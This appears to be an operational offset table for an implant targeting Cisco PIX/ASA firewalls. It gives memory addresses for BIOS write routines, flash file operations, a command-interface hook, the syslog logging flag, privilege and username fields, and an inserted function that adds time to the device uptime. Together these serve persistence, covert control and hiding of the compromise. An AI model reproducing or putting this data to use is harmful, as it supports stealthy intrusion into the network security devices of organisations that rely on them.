; --- SECTION I ---
;
0x40080200            // pix version
0x1b14000             // address of implant configuration
FlashClassAddr            0x00000000      // addr of flash structure (not used in 7.*)
CryptoDeviceAddr          0x099ae4c4      // addr of crypto structure
ArpTableAddrPtr           0x095d1d48      // addr of first entry in ARP table
NumInterfaces             0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2              0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
IfaceStruct2Len           0x00            // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
BiosClassAddr             0x099ba580      // addr of the bios class structure
BiosWriteAddr1            0x0831f180      // addr of the bios write function for one specific bios
BiosWriteAddr2            0x08321970      // addr of the bios write function for one specific bios
BiosWriteAddr3            0x08321400      // addr of the bios write function for one specific bios
BiosWriteAddr4            0x08322250      // addr of the bios write function for one specific bios
BiosWriteOffset           0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress         0x083bdc90      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress      0x08326cb0      // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress      0x0830ee30      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress     0x083267d0      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress     0x0830eb10      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress       0x083bd380      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress       0x083bdf70      // ifs_get_size; get the size of the provided open file
FlashChmodAddress         0x083bd820      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress      0x083bd980      // ifs_rename; move a file
FlashGetFileInfoAddress   0x00000000      // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress      0x083bedf0      // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset   0x0000002c      // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr     0x090b2970      // The address of a function that returns the platform string 
ASARestatFlashFlagAddr    0xffffffff      // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc              0x08060e20      // addr of the device announce function
DevIoctlOffset            0x70            // offset to ioctl function in device table
DuartTtyAddr              0x09540dc0      // addr of duart/0 tty entry
CIStartFunc               0x080aca20      // addr of the command interface start function -- telnet function
CommandListAddr           0x09606c80      // addr of the command list -- first parameter of ci
DeviceListPtrAddr         0x09895bc8      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset       0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr            0x090a8470      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr         0x09ac4cc0      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue               0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue              0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue               0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset               0x7c            // Offset into a thread struct containing the stdch pointer
StdErrOffset              0x80            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset            0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset               0x14            // offset into an environment struct containing the username 
EnvPtrOffset              0x88            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset              0x00000b18      // offset into the syslog structure where the logging level is stored
Open                      0x08061030      // open
ChannelConfigOffset       0x08            // offset into a channel where the configuration pointer is
InputModeOffset           0x14            // offset into a duart config structure where the input mode is stored
InputModeEsc              0x20            // Input mode used for entering escape sequence
WatchDogTimeout           0x0950e7e0      // Address where the thread timeout value is stored 
UpTimeCounter             0x099aa5c0      // Address of the up time counter
Display_uptime_addr       0x080b4520      // Address of the function that display the uptime
Inserted_code_addr        0x08fa9202      // Address of the our insterted function to add time to the uptime
i2cReadByte               0x08cdf5f0      // read byte function needed to operate on the bios of the asa 5505
i2cWriteByte              0x08cdf470      // write byte function needed to operate on the bios of the asa 5505
CLIHookAddress            0x080acec4      // Address of hook into the command interface
AvailMemoryPtr            0x09a59b60      // Address of total available memory
;
; --- END OF SECTION II ---
;
:EOS:
;
